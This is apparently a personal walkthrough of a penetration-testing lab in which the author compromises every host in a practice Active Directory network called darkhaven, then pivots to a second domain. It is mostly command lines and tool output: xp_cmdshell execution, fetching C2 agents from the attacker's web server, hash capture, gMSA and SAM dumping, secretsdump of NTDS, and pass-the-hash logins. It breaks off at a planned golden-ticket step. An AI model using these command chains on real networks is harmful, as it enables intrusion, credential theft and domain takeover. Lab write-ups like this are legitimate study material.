So since i have already solved this network i will skip the scope and objectives and jump straight in

# Setting listeners
So to start ill set 5 listeners for the 5 machines in subnet 2

For this ill be using adaptix C2 framework

![](Pasted%20image%2020260419153718.png)

All listeners are now set

# Retrieving credentials for `sql_svc`
Ill log into the web portal as the guest user and then query the sql_svc account to get the credentials

![548](Pasted%20image%2020260419153956.png)

```python
sql_svc:SqLS3rvic3!
```

```python
nxc mssql sql.ext.darkhaven.local -u 'sql_svc' -p 'SqLS3rvic3!'                              
MSSQL       10.10.10.133    1433   SQL              [*] Windows 11 / Server 2025 Build 26100 (name:SQL) (domain:ext.darkhaven.local) (EncryptionReq:False)
MSSQL       10.10.10.133    1433   SQL              [+] ext.darkhaven.local\sql_svc:SqLS3rvic3!
```
These credentials get me access to mssql on the sql server

```python
impacket-mssqlclient ext.darkhaven.local/sql_svc:'SqLS3rvic3!'@sql.ext.darkhaven.local
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL): Line 1: Changed database context to 'master'.
[*] INFO(SQL): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (sql_svc  dbo@master)> xp_cmdshell whoami
output                
-------------------   
nt authority\system   
NULL                  
SQL (sql_svc  dbo@master)>
```
xp_cmdshell is enabled

So on my listener for the sql server ill generate an agent and transfer it to the target

# NT authority system on the sql server

![466](Pasted%20image%2020260419154400.png)

Ive generated an agent for the sql listener and i can use xp_cmdshell to upload the agent then execute it

```python
SQL (sql_svc  dbo@master)> upload sql-agent.x64.exe C:\Users\Public\sql-agent.x64.exe
[+] Data length (b64-encoded): 117.34 KB with MD5: 48dcfdd66584938be5074d4bcc9553e8
[+] Uploading...
[+] Uploaded
[+] certutil -decode "C:\Users\Public\sql-agent.x64.exe.b64" "C:\Users\Public\sql-agent.x64.exe"
[+] del "C:\Users\Public\sql-agent.x64.exe.b64"
[+] certutil -hashfile "C:\Users\Public\sql-agent.x64.exe" MD5
[+] MD5 hashes match
SQL (sql_svc  dbo@master)> 
```
This uploaded the agent to the target

```python
SQL (sql_svc  dbo@master)> xp_cmdshell C:\Users\Public\sql-agent.x64.exe
```
This executed the agent so now if i look back at adaptix client ive got a connection

![](Pasted%20image%2020260419154739.png)

![](Pasted%20image%2020260419154806.png)

The SQL server is now compromised

# Administrator on the share server
![](Pasted%20image%2020260419154955.png)

Found a keepass database and a read me

```python
[19/04 15:50:38] operator [c5311829] beacon > cat README.txt
[19/04 15:50:38] [*] Task: read file
[19/04 15:50:41] [*] Agent called server, sent [27 bytes]
[19/04 15:50:41] [+] 'README.txt' file content:
﻿Darkhaven Technologies - IT Department Password Store
======================================================
File   : it_passwords.kdbx
Format : KeePass 2.x

Contents:
  - Network Infrastructure
      > Core Switch (sw-core-01)
      > Firewall Admin (fw-ext-01)
      > Out-of-Band Management (OOBM)
  - Servers
      > Domain Controller (dc.ext.darkhaven.local)
      > SQL Server (sql.ext.darkhaven.local)
      > Backup Server (bkp-01.ext.darkhaven.local)
  - Service Accounts
      > sql_svc           (SQL Server service account)
      > svc_backup        (Veeam Backup)
      > svc_monitoring    (SCOM data collector)
      > svc_webpool       (IIS application pool)
      > svc_sccm          (SCCM network access)
  - Cloud / SaaS
      > Azure Portal
      > Microsoft 365 Admin Center
      > Cloudflare DNS

IMPORTANT: Do not copy outside the management VLAN.
Access requests: it-security@darkhaven.local

Master Password: D@rkhav3n_IT_2024!
```
Its given me the master password for the keepass file so it saves me cracking it

Ill download the keepass database to my machine

```python
[19/04 15:52:11] operator [1b1823fc] beacon > download it_passwords.kdbx
[19/04 15:52:11] [*] Task: download file
[19/04 15:52:11] [*] Agent called server, sent [34 bytes]
[19/04 15:52:12] [+] The download of the 'C:\stored_passwords\it_passwords.kdbx' file (2782 bytes) has started: [fid ac755ec0]
[19/04 15:52:12] [+] File download complete: [fid ac755ec0]
```
This downloaded it now i can sync it to the client in adaptix to access it

![](Pasted%20image%2020260419155901.png)

```python
showard:5rtfgvb^RTFGVB
```

Ill connect via SMB on share.ext using these credentials and access the DarkHavenData share

Found an interesing file at \IT\Network\Runbooks\

```python
-- NETWORK PROVISIONING SERVICE ACCOUNT --
  Host      : share.ext.darkhaven.local (10.10.10.135)
  Username  : svc_netops
  Password  : N3t0ps$Svc_2024!
  Role      : Local Administrator on share server
  Purpose   : Automated network configuration backup scripts
              Runs nightly at 02:00 to pull switch/FW configs via TFTP
```
The file had some credentials inside

```python
svc_netops:N3t0ps$Svc_2024!
```

![668](Pasted%20image%2020260419161023.png)

I am able to get access via RDP on the share server and since the account is a localadmin i can open an administrator session

Now i have this i can set a beacon up again on this since i am now an administrator on the share server

![477](Pasted%20image%2020260419161241.png)

Ive generated the agent now i can transfer it to the target ill do this with a python webserver

```python
python3 -m http.server 1337  
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
```

```python
PS C:\Users\svc_netops\Documents> wget http://192.168.211.2:1337/share-agent.x64.exe -o share-agent.x64.exe
```
This downloaded the file

Now i can execute it!

```python
.\share-agent.x64.exe
```
This executed it!

![](Pasted%20image%2020260419161706.png)

I now have a second session on the domain this time on the Share server

# Administrator on the web server

Remembering the backup procedure i found earllier in the SMB share i already know there is a process where users connect to a SMB share i might be able to intercept NTLM hashes

I can do this with inveigh

## Capturing authentication
```python
svc_webpool::EC2AMAZ-IKFPL26:F183554159AB8EDD:DBBE87BCAF1F8E2C5FBC704B4BC35245:0101000000000000F0FA429879C7DC01EFED8D004E206D2500000000020012004400410052004B0048004100560045004E0001000A0053004800410052004500040026006500780074002E006400610072006B0068006100760065006E002E006C006F00630061006C0003003200730068006100720065002E006500780074002E006400610072006B0068006100760065006E002E006C006F00630061006C00050026006500780074002E006400610072006B0068006100760065006E002E006C006F00630061006C0007000800F0FA429879C7DC0106000400020000000800300030000000000000000000000000300000078B9E06F4ADD88F1FC47C5DAF96AFE83E05BFC550C86CFE5173879BD7B377ED0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310030002E003100330035000000000000000000
```
After uploading and runnign inveigh on the target via my C2 session i retrieved a hash for the svc_webpool

## Cracking the hash
```python
svc_webpool:D@rkH@v3n128!
```
So cracking the hash failed with rockyou but i saw a wordlist of previous password on the domain in the SMB share which is able to crack it!

## Checking authentication
```python
nxc smb web.ext.darkhaven.local -u 'svc_webpool' -p 'D@rkH@v3n128!' --local-auth
SMB         10.10.10.132    445    EC2AMAZ-IKFPL26  [*] Windows 11 / Server 2025 Build 26100 (name:EC2AMAZ-IKFPL26) (domain:EC2AMAZ-IKFPL26) (signing:False) (SMBv1:None)
SMB         10.10.10.132    445    EC2AMAZ-IKFPL26  [+] EC2AMAZ-IKFPL26\svc_webpool:D@rkH@v3n128! (Pwn3d!)
```
The output is giving me a `(Pwn3d!)` indicated which tells me this user is an admin!

```python
nxc winrm web.ext.darkhaven.local -u 'svc_webpool' -p 'D@rkH@v3n128!' --local-auth
WINRM       10.10.10.132    5985   EC2AMAZ-IKFPL26  [*] Windows 11 / Server 2025 Build 26100 (name:EC2AMAZ-IKFPL26) (domain:ext.darkhaven.local) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.10.132    5985   EC2AMAZ-IKFPL26  [+] EC2AMAZ-IKFPL26\svc_webpool:D@rkH@v3n128! (Pwn3d!)
```
They also have acces via winrm

This means i can now generate a beacon for my web listener and upload it via winrm to get a C2 session

![496](Pasted%20image%2020260419162933.png)

Ive generated the agent now ill upload it and execute it!

```python
evil-winrm -i web.ext.darkhaven.local -u svc_webpool -p 'D@rkH@v3n128!'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_webpool\Documents> upload web-agent.x64.exe
                                        
Info: Uploading /home/kali/hsm/darkhaven/web-agent.x64.exe to C:\Users\svc_webpool\Documents\web-agent.x64.exe
                                        
Data: 120148 bytes of 120148 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\svc_webpool\Documents> dir


    Directory: C:\Users\svc_webpool\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         4/19/2026   3:30 PM          90112 web-agent.x64.exe


*Evil-WinRM* PS C:\Users\svc_webpool\Documents> .\web-agent.x64.exe
*Evil-WinRM* PS C:\Users\svc_webpool\Documents> 
```
I should now have a session in my C2 client

![](Pasted%20image%2020260419163159.png)

New administrator session on the web server!

![](Pasted%20image%2020260419163232.png)

# Administrator on the CA server
```python
[19/04 16:34:23] operator [3cad25b1] beacon > cat maint_config.php@2025-01-09_083047
[19/04 16:34:23] [*] Task: read file
[19/04 16:34:24] [*] Agent called server, sent [51 bytes]
[19/04 16:34:24] [+] 'maint_config.php@2025-01-09_083047' file content:
<?php
/**
 * Darkhaven Technologies - Certificate Services Maintenance Script
 * Author  : K. Warren (kwarren@ext.darkhaven.local)
 * Purpose : Internal CA health check, certificate renewal automation,
 *           and web server certificate deployment for IIS/NGINX hosts.
 *
 * Usage   : php cert_maintenance.php [--check | --renew | --deploy]
 *
 * NOTE: This script is run manually from the web server during
 *       scheduled maintenance windows. Do not expose to the web root.
 *       Kept locally for convenience during cert rotation cycles.
 *
 * Last modified: 2025-01-09  kwarren
 */

// -----------------------------------------------------------------------
//  CONFIGURATION
// -----------------------------------------------------------------------

define('CA_HOST',       'ca.ext.darkhaven.local');
define('CA_IP',         '10.10.10.134');
define('CA_PORT',       443);
define('CA_ENROLL_URL', 'http://ca.ext.darkhaven.local/certsrv/');
define('DOMAIN',        'ext.darkhaven.local');
define('DOMAIN_SHORT',  'DARKHAVEN');

// Service account used to authenticate against the CA web enrollment interface
// TODO: move this to environment variable before next audit - kwarren 2025-01-09
define('CA_AUTH_USER',  'DARKHAVEN\\kwarren');
define('CA_AUTH_PASS',  '!@#darkhav3n123#@!');

// Certificate output paths
define('CERT_STAGING',  'C:\\inetpub\\darkhaven\\App_Data\\certs\\staging\\');
define('CERT_DEPLOY',   'C:\\inetpub\\darkhaven\\App_Data\\certs\\live\\');
define('CERT_BACKUP',   'C:\\inetpub\\darkhaven\\App_Data\\certs\\backup\\');
define('LOG_FILE',      'C:\\inetpub\\darkhaven\\App_Data\\cert_maintenance.log');

// Certificate templates available on ca.ext.darkhaven.local
$cert_templates = [
    'WebServer'         => 'Web Server certificate - IIS/NGINX hosts',
    'DomainController'  => 'DC authentication certificate',
    'User'              => 'Standard user certificate',
    'SubCA'             => 'Subordinate CA - requires approval',
    'DarkhavenWebSSL'   =>

+--- Task [3cad25b1] closed ----------------------------------------------------------+
```
Ive found credentials for a user `kwarren` for the CA server

```python
kwarren:!@#darkhav3n123#@!
```

```python
nxc smb ca.ext.darkhaven.local -u 'kwarren' -p '!@#darkhav3n123#@!'                            
SMB         10.10.10.134    445    CA               [*] Windows 11 / Server 2025 Build 26100 x64 (name:CA) (domain:ext.darkhaven.local) (signing:False) (SMBv1:None)
SMB         10.10.10.134    445    CA               [+] ext.darkhaven.local\kwarren:!@#darkhav3n123#@!
```
The user is compromised!

I will now collect bloodhound data using sharphound and a c2 session i just got on the web server

After collecting bloodhound data i see i have ReadGMSAPassword on the user `ca_svc_account$`

```python
nxc ldap dc.ext.darkhaven.local -u 'kwarren' -p '!@#darkhav3n123#@!' --gmsa               
LDAP        10.10.10.136    389    DC               [*] Windows 11 / Server 2025 Build 26100 (name:DC) (domain:ext.darkhaven.local) (signing:Enforced) (channel binding:No TLS cert) 
LDAP        10.10.10.136    389    DC               [+] ext.darkhaven.local\kwarren:!@#darkhav3n123#@! 
LDAP        10.10.10.136    389    DC               [*] Getting GMSA Passwords
LDAP        10.10.10.136    389    DC               Account: ca_svc_account$      NTLM: 3ab7add8db852831e7299c61ba35e2d2     PrincipalsAllowedToReadPassword: GRP-gMSA-ca_svc_account-Readers
```
I now have the NTLM hash of the `ca_svc_account$`

```python
nxc smb ca.ext.darkhaven.local -u 'ca_svc_account$' -H '3ab7add8db852831e7299c61ba35e2d2'      
SMB         10.10.10.134    445    CA               [*] Windows 11 / Server 2025 Build 26100 x64 (name:CA) (domain:ext.darkhaven.local) (signing:False) (SMBv1:None)
SMB         10.10.10.134    445    CA               [+] ext.darkhaven.local\ca_svc_account$:3ab7add8db852831e7299c61ba35e2d2 (Pwn3d!)
```
This user is also an administrator on the CA server

```python
nxc winrm ca.ext.darkhaven.local -u 'ca_svc_account$' -H '3ab7add8db852831e7299c61ba35e2d2'
WINRM       10.10.10.134    5985   CA               [*] Windows 11 / Server 2025 Build 26100 (name:CA) (domain:ext.darkhaven.local) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.10.134    5985   CA               [+] ext.darkhaven.local\ca_svc_account$:3ab7add8db852831e7299c61ba35e2d2 (Pwn3d!)
```
This user also has access via winrm so i can now generate a beacon and upload it via the winrm session

![546](Pasted%20image%2020260419164720.png)

I have now generated the beacon now ill get access via winrm upload the beacon and execute it

So it appears that account cannot get access via winrm so what ill do instead it just dump the SAM 

```python
nxc smb ca.ext.darkhaven.local -u 'ca_svc_account$' -H '3ab7add8db852831e7299c61ba35e2d2' --sam
SMB         10.10.10.134    445    CA               [*] Windows 11 / Server 2025 Build 26100 x64 (name:CA) (domain:ext.darkhaven.local) (signing:False) (SMBv1:None)
SMB         10.10.10.134    445    CA               [+] ext.darkhaven.local\ca_svc_account$:3ab7add8db852831e7299c61ba35e2d2 (Pwn3d!)
SMB         10.10.10.134    445    CA               [*] Dumping SAM hashes
SMB         10.10.10.134    445    CA               Administrator:500:aad3b435b51404eeaad3b435b51404ee:7af69f428fd21312a225c74e5f574ed6:::
SMB         10.10.10.134    445    CA               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.10.134    445    CA               DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.10.134    445    CA               WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7490f2a63d713a813eda5bf8fd1a8227:::
SMB         10.10.10.134    445    CA               ca_svc_account$:1000:aad3b435b51404eeaad3b435b51404ee:d825d33332279362b7c3e6ba121aa570:::
SMB         10.10.10.134    445    CA               [+] Added 5 SAM hashes to the database
```
Now i can use the administrator hash to get access via winrm 

```python
evil-winrm -i ca.ext.darkhaven.local -u 'Administrator' -H '7af69f428fd21312a225c74e5f574ed6'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload CA-agent.x64.exe
                                        
Info: Uploading /home/kali/hsm/darkhaven/CA-agent.x64.exe to C:\Users\Administrator\Documents\CA-agent.x64.exe
                                        
Data: 120148 bytes of 120148 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir


    Directory: C:\Users\Administrator\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         4/19/2026   3:51 PM          90112 ca-agent.x64.exe


*Evil-WinRM* PS C:\Users\Administrator\Documents> ./ca-agent.x64.exe
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```
Now i should have a session on my c2 client

![](Pasted%20image%2020260419165237.png)

New administrator session on the CA server

# Administrator on the external Domain Controller
```python
nxc smb ca.ext.darkhaven.local -u 'ca_svc_account$' -H '3ab7add8db852831e7299c61ba35e2d2' -M powershell_history
SMB         10.10.10.134    445    CA               [*] Windows 11 / Server 2025 Build 26100 x64 (name:CA) (domain:ext.darkhaven.local) (signing:False) (SMBv1:None)
SMB         10.10.10.134    445    CA               [+] ext.darkhaven.local\ca_svc_account$:3ab7add8db852831e7299c61ba35e2d2 (Pwn3d!)
POWERSHE... 10.10.10.134    445    CA               C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
POWERSHE... 10.10.10.134    445    CA                   $timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
POWERSHE... 10.10.10.134    445    CA                   $localLog = "C:\Temp\network_health_$timestamp.txt"
POWERSHE... 10.10.10.134    445    CA                   $ping = Test-Connection -ComputerName $device.IP -Count 2 -Quiet`
POWERSHE... 10.10.10.134    445    CA                   $tcp22 = Test-NetConnection -ComputerName $device.IP -Port 22 -InformationLevel Quiet`
POWERSHE... 10.10.10.134    445    CA                   Write-Host "Health check complete. Preparing to upload log..."
POWERSHE... 10.10.10.134    445    CA                   net use \\dc01\share /user:ldap_svc 6trfgvb**hs#@jskKFHJAh34
POWERSHE... 10.10.10.134    445    CA                   net use \\dc01\share /delete
POWERSHE... 10.10.10.134    445    CA                   echo "" > C:\Users\Administrator.DARKHAVEN\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
POWERSHE... 10.10.10.134    445    CA                   net user "ca_svc_account$" "RTGHs82358sUFU*$%*&#jskj"
POWERSHE... 10.10.10.134    445    CA               C:\Users\Administrator.DARKHAVEN\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
POWERSHE... 10.10.10.134    445    CA                   
POWERSHE... 10.10.10.134    445    CA                   
POWERSHE... 10.10.10.134    445    CA                   
POWERSHE... 10.10.10.134    445    CA               C:\Users\ca_svc_account$\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
POWERSHE... 10.10.10.134    445    CA                   net user administrator "ebz0yxy3txh9BDE*yeh"
```
Ill use a nxc module to dump the powershell history

```python
ldap_svc:6trfgvb**hs#@jskKFHJAh34
ca_svc_account$:RTGHs82358sUFU*$%*&#jskj
Administrator:ebz0yxy3txh9BDE*yeh
```
The ca service account is already compromised

And the administrator on this machine is already compromised so the only interesting thing here is the ldap svc

```python
nxc smb dc.ext.darkhaven.local -u 'ldap_svc' -p '6trfgvb**hs#@jskKFHJAh34' -k                        
SMB         dc.ext.darkhaven.local 445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:ext.darkhaven.local) (signing:True) (SMBv1:None)
SMB         dc.ext.darkhaven.local 445    DC               [+] ext.darkhaven.local\ldap_svc:6trfgvb**hs#@jskKFHJAh34 (Pwn3d!)
```
Using kerberos authentication i see that the ldap_svc account is an administrator on the domain controller

NTLM auth failed this tells me this user is in the protected users group

So ive got two options here i can either setup a realm and attempt to authenticate to winrm on the dc using `ldap_svc` or i can use `ldap_svc` access to perform a secretsdump and get the administrator hash then winrm that way!

```python
impacket-secretsdump ext.darkhaven.local/'ldap_svc':'6trfgvb**hs#@jskKFHJAh34'@dc.ext.darkhaven.local -k
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x518057f001e4dca9dfdc66464040ef20
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f45531e2a05d63ee77bdfbb5b2e5530:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
DARKHAVEN\DC$:plain_password_hex:380036005400390069004b00350032004d0072005a005a00490071004b004d0042007a0058004f0069006e004d006e004e006d007300720074004b005200430035006e007a0049006a0051003d00500030003d0071005a0062003500680056004c0068004e00730046006c004e0055006500730042006f00590048002b0064004b0070007a006f0070006a0057006a0043006a004900750050007900310063007a00740062004e0050006b004b003400730057003400760077002b007900480049006d006b0069006d0079005900450073003600300049004300480072002b00730039004200330056004a005500700063007100510050007a004d0071004800510058007000370066004b006c006900490038003400500079006400340051004f0072002b0041006c0047006200330064005a0049003d00320046005200500073004d006d003400430053006c0070006d007a0053006f003d006b006a0057006a00680036006e00300070006b00540054007a00500079006b006800720061004a0069003300410044004b00750030006e0049003d004f00370039004d005a0032004e006600670078006e0056005a00550041005700590077007a004b00580065005a005a006400320045006f00750067007400530064004a0054005600420047002b004800350073004d0075006d00780067003d006300620055005a003700
DARKHAVEN\DC$:aad3b435b51404eeaad3b435b51404ee:149f952298773d9914299765062cdca5:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x7c133bb3e82017ef809376cf683ac20b909849fc
dpapi_userkey:0xbafc69384c317fcffec3c7fe3d7a41e88fe14d1a
[*] NL$KM 
 0000   D6 F9 1E BE 20 95 21 6A  88 22 1F 5C 92 CE 2C 8A   .... .!j.".\..,.
 0010   BB CF 2C 38 59 53 A4 3A  EF A0 03 DA EA A5 A8 CF   ..,8YS.:........
 0020   0E 6F 91 92 02 3E 5B 45  40 E2 C7 A8 D5 DA 8B 11   .o...>[E@.......
 0030   6D 77 6B 5F 3F 78 48 12  0F BF A8 CE 06 C2 C6 7C   mwk_?xH........|
NL$KM:d6f91ebe2095216a88221f5c92ce2c8abbcf2c385953a43aefa003daeaa5a8cf0e6f9192023e5b4540e2c7a8d5da8b116d776b5f3f7848120fbfa8ce06c2c67c
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] CCache file is not found. Skipping...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c093cbd6000fa289a92b412131a4cefa:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:70eed1cbbc6e2c26fc0ee22c17d3cde1:::

...[SNIP]...
```
Ill use `ldap_svc` access as an administrator to dump all hashes

There are two administrator hashes one is from NTDS.dit and the other is from SAM

SAM holds local user hashes NTDS holds domain wide credentials so in this context the administrator thats from SAM is a local admin hash and the other from NTDS is a domain admin hash!

```python
evil-winrm -i dc.ext.darkhaven.local -u Administrator -H 'c093cbd6000fa289a92b412131a4cefa'  
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
darkhaven\administrator
```
After using the domain admin hash i get access

```python
*Evil-WinRM* PS C:\Users\Administrator\Documents> net user ldap_svc
User name                    ldap_svc
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            3/2/2026 8:38:05 PM
Password expires             Never
Password changeable          3/2/2026 8:38:05 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   4/19/2026 4:02:30 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Protected Users      *Domain Admins
                             *Domain Users
The command completed successfully.
```
So the `ldap_svc` account is in the protected users group this is why NTLM auth failed and kerberos succeeded

I could have setup a realm and got access via winrm through kerberos as the `ldap_svc` user but the alternative was to use `ldap_svc` administrator access on the DC to dump the hashes of the other admins then use their credentials to authenticate since they werent likely to be in the protected users group

So now i have access via winrm i can setup a beacon and upload and execute!

![446](Pasted%20image%2020260419171143.png)

I now have the beacon i just need to upload

```python
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload dc-ext-agent.x64.exe
                                        
Info: Uploading /home/kali/hsm/darkhaven/dc-ext-agent.x64.exe to C:\Users\Administrator\Documents\dc-ext-agent.x64.exe
                                        
Data: 120148 bytes of 120148 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir


    Directory: C:\Users\Administrator\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         2/27/2026  12:23 AM                WindowsPowerShell
-a----         4/19/2026   4:14 PM          90112 dc-ext-agent.x64.exe


*Evil-WinRM* PS C:\Users\Administrator\Documents> .\dc-ext-agent.x64.exe
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```
I should now have a c2 session as the administrator

![](Pasted%20image%2020260419171502.png)

So that is now Subnet 1 fully compromised

![](Pasted%20image%2020260419171626.png)


# Administrator on `dc02` in subnet 1
Now the subnet is fully compromised i need to pivot to the main subnet!

Before i do anything ill set listeners for both domain controllers in subnet 1

![](Pasted%20image%2020260419172733.png)

Both listeners are set for the remaining two systems

```python
+--- Task [14f5be24] closed ----------------------------------------------------------+

[19/04 17:23:52] operator [90a83454] beacon > ls
[19/04 17:23:52] [*] Task: list files
[19/04 17:23:54] [*] Agent called server, sent [18 bytes]
[19/04 17:23:54] [+] Listing 'C:\Users\Administrator\Desktop'
 Type     Size           Last Modified         Name
 ----     ---------      ----------------      ----
          0.28 Kb        27/02/2026 00:10      desktop.ini
          0.46 Kb        14/11/2024 01:03      EC2 Feedback.url
          0.49 Kb        14/11/2024 01:03      EC2 Microsoft Windows Guide.url
          259.80 Kb      03/03/2026 12:53      ldap_sync.exe
          2.30 Kb        27/02/2026 00:28      Microsoft Edge.lnk
          0.08 Kb        07/03/2026 02:18      root.txt

+--- Task [90a83454] closed ----------------------------------------------------------+
```
Interesting file `ldap_sync.exe` ill transfer this to my machine

```python
head -n 40 ldap_sync.exe

ldap_svc:D@rkhav3nLDAP2024!
```
Hardcoded credentials in the .exe file

```python
nxc smb dc02.corp.darkhaven.tech -d corp.darkhaven.tech -u 'ldap_svc' -p 'D@rkhav3nLDAP2024!'
SMB         10.10.10.5      445    EC2AMAZ-KK0CT8N  [*] Windows 11 / Server 2025 Build 26100 x64 (name:EC2AMAZ-KK0CT8N) (domain:corp.darkhaven.tech) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.10.10.5      445    EC2AMAZ-KK0CT8N  [+] corp.darkhaven.tech\ldap_svc:D@rkhav3nLDAP2024! (Pwn3d!)
```
This user is an admin on `dc02`

```python
nxc winrm dc02.corp.darkhaven.tech -u 'ldap_svc' -p 'D@rkhav3nLDAP2024!'
WINRM       10.10.10.5      5985   EC2AMAZ-KK0CT8N  [*] Windows 11 / Server 2025 Build 26100 (name:EC2AMAZ-KK0CT8N) (domain:corp.darkhaven.tech) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.10.5      5985   EC2AMAZ-KK0CT8N  [+] corp.darkhaven.tech\ldap_svc:D@rkhav3nLDAP2024! (Pwn3d!)
```
This user also has access over winrm

![526](Pasted%20image%2020260419185538.png)

Ive generated the beacon to go on the target

```python
evil-winrm -i dc02.corp.darkhaven.tech -u 'ldap_svc' -p 'D@rkhav3nLDAP2024!'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ldap_svc\Documents> upload dc02-corp-agent.x64.exe
```
Then after uploading it i can execute it

```python
*Evil-WinRM* PS C:\Users\ldap_svc\Documents> .\dc02-corp-agent.x64.exe
```
Now ill have a new session in adaptix c2

![](Pasted%20image%2020260419185835.png)

Now the dc02 has been compromised!

# Full domain compromise

Looking at bloodhound there is a pretty good indicator of a golden ticket attack
![](Pasted%20image%2020260419185941.png)

## Golden ticket
Ill start by trying to dump the domain admins hash using raise child in the case that SID filterin

```python

```
